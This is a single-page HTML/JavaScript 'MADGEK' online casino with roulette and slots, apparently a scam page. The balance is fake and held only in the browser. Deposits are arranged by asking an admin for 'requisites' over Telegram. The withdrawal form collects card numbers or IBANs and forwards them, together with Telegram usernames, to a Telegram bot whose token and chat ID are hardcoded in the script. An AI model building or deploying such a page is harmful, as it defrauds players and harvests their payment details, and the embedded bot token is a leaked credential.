<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MADGEK CASINO & SUITE</title>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #06080c;
            --bg-card: #0d121d;
            --bg-card-hover: #131a2a;
            --accent-gold: #d4af37;
            --accent-gold-bright: #f3e5ab;
            --accent-gold-dark: #aa820a;
            --border-color: #1e293b;
            --border-gold: rgba(212, 175, 55, 0.3);
            --text-main: #f8fafc;
            --text-muted: #64748b;
            --danger: #ef4444;
            --success: #10b981;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; user-select: none; }
        body { background: var(--bg-base); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }

        header {
            width: 100%;
            padding: 16px 24px;
            background: rgba(13, 18, 29, 0.85);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border-gold);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 50;
        }

        .brand {
            font-family: 'Cinzel', serif;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 3px;
            background: linear-gradient(135deg, var(--accent-gold-bright), var(--accent-gold), var(--accent-gold-dark));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
        }

        .header-actions { display: flex; align-items: center; gap: 16px; }

        .lang-select {
            background: var(--bg-base);
            color: var(--text-main);
            border: 1px solid var(--border-color);
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 13px;
            outline: none;
            cursor: pointer;
            transition: 0.2s;
        }
        .lang-select:hover { border-color: var(--accent-gold); }

        .balance-badge {
            background: linear-gradient(180deg, rgba(212, 175, 55, 0.1), rgba(0,0,0,0.4));
            border: 1px solid var(--border-gold);
            padding: 6px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
        }
        .balance-badge span { color: var(--accent-gold); }

        main { max-width: 1100px; margin: 0 auto; width: 100%; padding: 24px; flex: 1; }

        .nav-tabs {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 12px;
        }
        .tab-btn {
            background: transparent;
            border: none;
            color: var(--text-muted);
            font-size: 15px;
            font-weight: 600;
            padding: 8px 16px;
            cursor: pointer;
            border-radius: 6px;
            transition: 0.2s;
        }
        .tab-btn:hover { color: var(--text-main); }
        .tab-btn.active {
            background: var(--bg-card);
            color: var(--accent-gold);
            border: 1px solid var(--border-gold);
        }

        .game-panel { display: none; }
        .game-panel.active { display: block; }

        .game-grid {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 32px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }

        .btn {
            background: linear-gradient(135deg, var(--accent-gold), var(--accent-gold-dark));
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 14px;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: 0.2s;
            text-transform: uppercase;
        }
        .btn:hover { transform: translateY(-1px); box-shadow: 0 0 15px rgba(212, 175, 55, 0.4); }
        .btn-success { background: linear-gradient(135deg, #10b981, #047857); color: #fff; }
        .btn-danger { background: linear-gradient(135deg, #ef4444, #b91c1c); color: #fff; }

        /* VIP Roulette Styles */
        .roulette-container { display: flex; flex-direction: column; align-items: center; gap: 24px; }
        .wheel-box { position: relative; width: 280px; height: 280px; border-radius: 50%; border: 8px solid #2a1f06; box-shadow: 0 0 30px rgba(0,0,0,0.8), inset 0 0 20px #000; }
        .wheel-canvas { width: 100%; height: 100%; border-radius: 50%; transition: transform 4s cubic-bezier(0.15, 0.85, 0.35, 1); }
        .wheel-pointer { position: absolute; top: -12px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-top: 18px solid var(--accent-gold-bright); z-index: 10; filter: drop-shadow(0 2px 4px #000); }

        .bet-board { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
        .bet-btn { background: #161e2e; border: 1px solid var(--border-color); color: #fff; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-weight: 600; }
        .bet-btn.selected { border-color: var(--accent-gold); background: rgba(212, 175, 55, 0.15); color: var(--accent-gold); }

        /* Slots Styles */
        .slots-display { display: flex; gap: 16px; justify-content: center; margin: 32px 0; }
        .slot-reel { width: 90px; height: 110px; background: #06080c; border: 2px solid var(--border-gold); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 48px; box-shadow: inset 0 0 15px #000; }

        /* Controls */
        .controls-row { display: flex; gap: 16px; align-items: center; justify-content: center; margin-top: 24px; }
        .input-dark { background: #06080c; border: 1px solid var(--border-color); color: #fff; padding: 12px; border-radius: 8px; outline: none; width: 140px; text-align: center; font-weight: 600; }

        /* Modals */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 100; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--border-gold); width: 90%; max-width: 420px; padding: 32px; border-radius: 16px; box-shadow: 0 25px 50px rgba(0,0,0,0.7); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h3 { font-family: 'Cinzel', serif; color: var(--accent-gold); }
        .close-btn { cursor: pointer; color: var(--text-muted); font-size: 20px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
        .form-group input { width: 100%; background: #06080c; border: 1px solid var(--border-color); color: #fff; padding: 12px; border-radius: 8px; outline: none; }
        .form-group input:focus { border-color: var(--accent-gold); }

        .cash-actions { display: flex; gap: 12px; justify-content: flex-end; margin-top: 24px; }
    </style>
</head>
<body>

    <header>
        <div class="brand">MADGEK</div>
        <div class="header-actions">
            <select class="lang-select" id="langSelect" onchange="changeLanguage(this.value)">
                <option value="ru">Русский</option>
                <option value="en">English</option>
                <option value="pl">Polski</option>
                <option value="zh">中文</option>
            </select>
            <div class="balance-badge">
                <span id="txt-bal">Баланс</span>: <span id="balance">100.00</span> PLN
            </div>
        </div>
    </header>

    <main>
        <div class="nav-tabs">
            <button class="tab-btn active" onclick="switchTab('roulette')" id="tab-roulette">Европейская Рулетка</button>
            <button class="tab-btn" onclick="switchTab('slots')" id="tab-slots">VIP Слоты</button>
        </div>

        <!-- Рулетка -->
        <div id="panel-roulette" class="game-panel active">
            <div class="game-grid roulette-container">
                <div class="wheel-box">
                    <div class="wheel-pointer"></div>
                    <canvas id="wheelCanvas" class="wheel-canvas" width="280" height="280"></canvas>
                </div>

                <div class="bet-board">
                    <button class="bet-btn selected" onclick="selectBet('red')" id="bet-red">Красное (x2)</button>
                    <button class="bet-btn" onclick="selectBet('black')" id="bet-black">Черное (x2)</button>
                    <button class="bet-btn" onclick="selectBet('zero')" id="bet-zero">Зеро (x36)</button>
                </div>

                <div class="controls-row">
                    <input type="number" id="rouletteBet" class="input-dark" value="10" min="1">
                    <button class="btn" onclick="spinRoulette()" id="btn-spin">Вращать</button>
                </div>
            </div>
        </div>

        <!-- Слоты -->
        <div id="panel-slots" class="game-panel">
            <div class="game-grid" style="text-align: center;">
                <div class="slots-display">
                    <div class="slot-reel" id="reel1">7️⃣</div>
                    <div class="slot-reel" id="reel2">7️⃣</div>
                    <div class="slot-reel" id="reel3">7️⃣</div>
                </div>

                <div class="controls-row">
                    <input type="number" id="slotBet" class="input-dark" value="10" min="1">
                    <button class="btn" onclick="spinSlots()" id="btn-slot-spin">Крутить</button>
                </div>
            </div>
        </div>

        <div class="cash-actions">
            <button class="btn btn-success" onclick="openModal('depositModal')" id="btn-dep">Пополнить</button>
            <button class="btn btn-danger" onclick="openModal('withdrawModal')" id="btn-with">Вывести</button>
        </div>
    </main>

    <!-- Modal Deposit -->
    <div id="depositModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="m-dep-title">Пополнение счета</h3>
                <span class="close-btn" onclick="closeModal('depositModal')">&times;</span>
            </div>
            <div class="form-group">
                <label id="lbl-dep-amount">Сумма (PLN)</label>
                <input type="number" id="depositAmount" placeholder="100">
            </div>
            <div class="form-group">
                <label id="lbl-dep-user">Telegram Username</label>
                <input type="text" id="depositUser" placeholder="@username">
            </div>
            <button class="btn btn-success" style="width: 100%;" onclick="sendDepositRequest()" id="btn-dep-submit">Запросить реквизиты</button>
        </div>
    </div>

    <!-- Modal Withdraw -->
    <div id="withdrawModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="m-with-title">Вывод средств</h3>
                <span class="close-btn" onclick="closeModal('withdrawModal')">&times;</span>
            </div>
            <div class="form-group">
                <label id="lbl-with-amount">Сумма (PLN)</label>
                <input type="number" id="withdrawAmount" placeholder="100">
            </div>
            <div class="form-group">
                <label id="lbl-with-card">Реквизиты (Карта / IBAN)</label>
                <input type="text" id="withdrawCard" placeholder="4149 ...">
            </div>
            <div class="form-group">
                <label id="lbl-with-user">Telegram Username</label>
                <input type="text" id="withdrawUser" placeholder="@username">
            </div>
            <button class="btn btn-danger" style="width: 100%;" onclick="sendWithdrawRequest()" id="btn-with-submit">Создать заявку</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8803585699:AAEE3Co6djkpKMwUySXbmpdg0tvUchsaShw";
        const CHAT_ID = "8240933602";

        let balance = 100.00;
        let selectedBetType = 'red';
        let currentRotation = 0;
        let isSpinning = false;

        const i18n = {
            ru: {
                bal: "Баланс", tabRoulette: "Европейская Рулетка", tabSlots: "VIP Слоты",
                red: "Красное (x2)", black: "Черное (x2)", zero: "Зеро (x36)",
                spin: "Вращать", slotSpin: "Крутить", dep: "Пополнить", with: "Вывести",
                mDepTitle: "Пополнение счета", mWithTitle: "Вывод средств",
                lblAmount: "Сумма (PLN)", lblUser: "Telegram Username", lblCard: "Реквизиты (Карта / IBAN)",
                btnDepSubmit: "Запросить реквизиты", btnWithSubmit: "Создать заявку",
                alertFill: "Заполните все поля!", alertLowBal: "Недостаточно средств на балансе!",
                msgDepSent: "Запрос отправлен. Ожидайте реквизиты от администратора.",
                msgWithSent: "Заявка на вывод принята в обработку."
            },
            en: {
                bal: "Balance", tabRoulette: "European Roulette", tabSlots: "VIP Slots",
                red: "Red (x2)", black: "Black (x2)", zero: "Zero (x36)",
                spin: "Spin", slotSpin: "Spin", dep: "Deposit", with: "Withdraw",
                mDepTitle: "Deposit Funds", mWithTitle: "Withdrawal Request",
                lblAmount: "Amount (PLN)", lblUser: "Telegram Username", lblCard: "Payment Details (Card / IBAN)",
                btnDepSubmit: "Request Requisites", btnWithSubmit: "Submit Request",
                alertFill: "Please fill all fields!", alertLowBal: "Insufficient funds!",
                msgDepSent: "Request sent. Wait for requisites from administrator.",
                msgWithSent: "Withdrawal request submitted for processing."
            },
            pl: {
                bal: "Saldo", tabRoulette: "Ruletka Europejska", tabSlots: "Sloty VIP",
                red: "Czerwone (x2)", black: "Czarne (x2)", zero: "Zero (x36)",
                spin: "Zakręć", slotSpin: "Zakręć", dep: "Depozyt", with: "Wypłata",
                mDepTitle: "Zasilenie konta", mWithTitle: "Żądanie wypłaty",
                lblAmount: "Kwota (PLN)", lblUser: "Telegram Username", lblCard: "Dane do płatności (Karta / IBAN)",
                btnDepSubmit: "Poproś о dane", btnWithSubmit: "Złóż wniosek",
                alertFill: "Wypełnij wszystkie pola!", alertLowBal: "Niewystarczające środki!",
                msgDepSent: "Zapytanie wysłane. Oczekuj na dane od administratora.",
                msgWithSent: "Wniosek о wypłatę przyjęty."
            },
            zh: {
                bal: "余额", tabRoulette: "欧式轮盘", tabSlots: "VIP 老虎机",
                red: "红 (x2)", black: "黑 (x2)", zero: "零 (x36)",
                spin: "旋转", slotSpin: "旋转", dep: "充值", with: "提现",
                mDepTitle: "账户充值", mWithTitle: "申请提现",
                lblAmount: "金额 (PLN)", lblUser: "Telegram 用户名", lblCard: "收款账号 (银行卡 / IBAN)",
                btnDepSubmit: "获取充值账号", btnWithSubmit: "提交申请",
                alertFill: "请填写所有字段！", alertLowBal: "余额不足！",
                msgDepSent: "请求已发送，请等待管理员回复。",
                msgWithSent: "提现申请已提交处理。"
            }
        };

        let currentLang = 'ru';

        function changeLanguage(lang) {
            currentLang = lang;
            const t = i18n[lang];
            document.getElementById('txt-bal').innerText = t.bal;
            document.getElementById('tab-roulette').innerText = t.tabRoulette;
            document.getElementById('tab-slots').innerText = t.tabSlots;
            document.getElementById('bet-red').innerText = t.red;
            document.getElementById('bet-black').innerText = t.black;
            document.getElementById('bet-zero').innerText = t.zero;
            document.getElementById('btn-spin').innerText = t.spin;
            document.getElementById('btn-slot-spin').innerText = t.slotSpin;
            document.getElementById('btn-dep').innerText = t.dep;
            document.getElementById('btn-with').innerText = t.with;
            document.getElementById('m-dep-title').innerText = t.mDepTitle;
            document.getElementById('m-with-title').innerText = t.mWithTitle;
            document.getElementById('lbl-dep-amount').innerText = t.lblAmount;
            document.getElementById('lbl-with-amount').innerText = t.lblAmount;
            document.getElementById('lbl-dep-user').innerText = t.lblUser;
            document.getElementById('lbl-with-user').innerText = t.lblUser;
            document.getElementById('lbl-with-card').innerText = t.lblCard;
            document.getElementById('btn-dep-submit').innerText = t.btnDepSubmit;
            document.getElementById('btn-with-submit').innerText = t.btnWithSubmit;
        }

        function updateBalance() {
            document.getElementById('balance').innerText = balance.toFixed(2);
        }

        function switchTab(tab) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.game-panel').forEach(p => p.classList.remove('active'));
            document.getElementById(`tab-${tab}`).classList.add('active');
            document.getElementById(`panel-${tab}`).classList.add('active');
        }

        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        function selectBet(type) {
            selectedBetType = type;
            document.querySelectorAll('.bet-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById(`bet-${type}`).classList.add('selected');
        }

        // Draw Roulette Wheel
        const numbers = [0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5, 24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26];
        const redNumbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36];

        function drawWheel() {
            const canvas = document.getElementById('wheelCanvas');
            const ctx = canvas.getContext('2d');
            const numSlices = numbers.length;
            const sliceAngle = (2 * Math.PI) / numSlices;

            ctx.clearRect(0, 0, 280, 280);
            for (let i = 0; i < numSlices; i++) {
                const angle = i * sliceAngle;
                ctx.beginPath();
                ctx.moveTo(140, 140);
                ctx.arc(140, 140, 135, angle, angle + sliceAngle);
                ctx.closePath();

                if (numbers[i] === 0) ctx.fillStyle = '#10b981';
                else if (redNumbers.includes(numbers[i])) ctx.fillStyle = '#dc2626';
                else ctx.fillStyle = '#111827';

                ctx.fill();
                ctx.strokeStyle = '#2a1f06';
                ctx.stroke();

                ctx.save();
                ctx.translate(140, 140);
                ctx.rotate(angle + sliceAngle / 2);
                ctx.fillStyle = '#fff';
                ctx.font = 'bold 10px Inter';
                ctx.fillText(numbers[i], 105, 4);
                ctx.restore();
            }
        }
        drawWheel();

        function spinRoulette() {
            if (isSpinning) return;
            const bet = parseFloat(document.getElementById('rouletteBet').value);
            const t = i18n[currentLang];
            if (bet > balance || bet <= 0) { alert(t.alertLowBal); return; }

            balance -= bet;
            updateBalance();
            isSpinning = true;

            const randomIndex = Math.floor(Math.random() * numbers.length);
            const sliceAngle = 360 / numbers.length;
            const targetDegree = 360 - (randomIndex * sliceAngle);
            const spins = 5 * 360;
            currentRotation += spins + targetDegree - (currentRotation % 360);

            const canvas = document.getElementById('wheelCanvas');
            canvas.style.transform = `rotate(${currentRotation}deg)`;

            setTimeout(() => {
                isSpinning = false;
                const winningNum = numbers[randomIndex];
                let isWin = false;
                let payout = 0;

                if (selectedBetType === 'zero' && winningNum === 0) { isWin = true; payout = bet * 36; }
                else if (selectedBetType === 'red' && redNumbers.includes(winningNum)) { isWin = true; payout = bet * 2; }
                else if (selectedBetType === 'black' && winningNum !== 0 && !redNumbers.includes(winningNum)) { isWin = true; payout = bet * 2; }

                if (isWin) {
                    balance += payout;
                    updateBalance();
                    alert(`Winning Number: ${winningNum}! +${payout.toFixed(2)} PLN`);
                } else {
                    alert(`Winning Number: ${winningNum}. Try again!`);
                }
            }, 4000);
        }

        function spinSlots() {
            const bet = parseFloat(document.getElementById('slotBet').value);
            const t = i18n[currentLang];
            if (bet > balance || bet <= 0) { alert(t.alertLowBal); return; }

            balance -= bet;
            updateBalance();

            const items = ['🍒', '🍋', '🔔', '💎', '7️⃣'];
            let r1 = items[Math.floor(Math.random() * items.length)];
            let r2 = items[Math.floor(Math.random() * items.length)];
            let r3 = items[Math.floor(Math.random() * items.length)];

            document.getElementById('reel1').innerText = r1;
            document.getElementById('reel2').innerText = r2;
            document.getElementById('reel3').innerText = r3;

            if (r1 === r2 && r2 === r3) {
                let win = bet * 10;
                balance += win;
                updateBalance();
                setTimeout(() => alert(`🎉 JACKPOT! +${win.toFixed(2)} PLN`), 100);
            }
        }

        function sendDepositRequest() {
            const amount = document.getElementById('depositAmount').value;
            const user = document.getElementById('depositUser').value;
            const t = i18n[currentLang];

            if (!amount || !user) { alert(t.alertFill); return; }

            const text = `💳 <b>Запрос на пополнение (MADGEK)</b>\n\n👤 Игрок: ${user}\n💰 Сумма: ${amount} PLN`;
            sendToTelegram(text, t.msgDepSent);
            closeModal('depositModal');
        }

        function sendWithdrawRequest() {
            const amount = document.getElementById('withdrawAmount').value;
            const card = document.getElementById('withdrawCard').value;
            const user = document.getElementById('withdrawUser').value;
            const t = i18n[currentLang];

            if (!amount || !card || !user) { alert(t.alertFill); return; }
            if (parseFloat(amount) > balance) { alert(t.alertLowBal); return; }

            const text = `🚨 <b>Заявка на вывод (MADGEK)</b>\n\n👤 Игрок: ${user}\n💰 Сумма: ${amount} PLN\n💳 Реквизиты: <code>${card}</code>`;
            sendToTelegram(text, t.msgWithSent);

            balance -= parseFloat(amount);
            updateBalance();
            closeModal('withdrawModal');
        }

        function sendToTelegram(text, successMessage) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
            })
            .then(res => { if (res.ok) alert(successMessage); else alert("API Error."); })
            .catch(() => alert("Network Error."));
        }
    </script>
</body>
</html>
